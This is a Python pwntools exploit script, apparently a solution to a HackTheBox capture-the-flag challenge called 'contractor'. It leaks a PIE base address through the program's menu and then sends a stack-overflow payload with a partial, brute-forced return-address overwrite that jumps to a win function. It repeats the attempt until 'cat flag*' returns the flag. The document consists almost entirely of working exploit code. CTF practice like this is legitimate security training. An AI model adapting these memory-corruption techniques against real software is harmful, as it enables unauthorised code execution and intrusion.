#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'critical'

cnt = 1
fname = './contractor'

while True:
    io = process(fname)

    elf = ELF(fname, checksec=False)

    try:
        _ = io.sendlineafter(b'> ', b'A')
        _ = io.sendlineafter(b'> ', b'B')
        _ = io.sendlineafter(b'> ', b'1')
        _ = io.sendlineafter(b'> ', b'D' * 0x10)

        _ = io.recvuntil(b'D' * 0x10)
        pie_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
        elf.address = pie_leak - 0x1b50
        # IDEA: \r + end='' to achieve the goal that only display last successful try
        print(f'\r{cnt} pie_leak: {pie_leak:#x}, pie_base: {elf.address:#x}', end='')

        # for overflow
        win = elf.sym['contract']
        _ = io.sendlineafter(b'> ', b'4')
        # $rbp - 0x1c -> while loop cnt, overwrite a number > 1 will jump out loop
        payload = b'\x00' * 0x18 + b'B' * 8 # fill gaps
        payload += b'\x2f' # lower nibble f must be there, higher nibble is guess
        payload += p64(win)
        _ = io.sendlineafter(b': ', payload)

        io.sendline(b'cat flag*')
        flag = io.recvline_contains(b'HTB', timeout=0.2)

        if b'HTB' in flag:
            print(f'\n{cnt} {flag.decode()}')
            io.close()
            # BUG: this just raise SystemExit() Exception, will be capture by folloing except if
            # that not limited to EOFError, which cause dead loop
            exit()
    except EOFError as e:
        cnt += 1
        io.close()
